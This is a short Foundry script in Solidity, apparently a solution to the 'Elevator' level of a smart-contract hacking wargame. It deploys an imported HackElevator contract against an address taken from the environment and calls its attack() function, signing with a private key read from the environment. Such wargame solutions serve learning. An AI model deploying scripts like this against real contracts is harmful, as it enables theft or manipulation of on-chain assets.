// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import { HackElevator } from "../../contracts/solutions/HackElevator.sol";

contract ElevatorScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("ACCOUNT_PRIVATE_KEY");
        address levelInstanceAddress = vm.envAddress("CONTRACT_INSTANCE_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);

        HackElevator hackElevator = new HackElevator(levelInstanceAddress, 5);

        hackElevator.attack();

        vm.stopBroadcast();

    }
}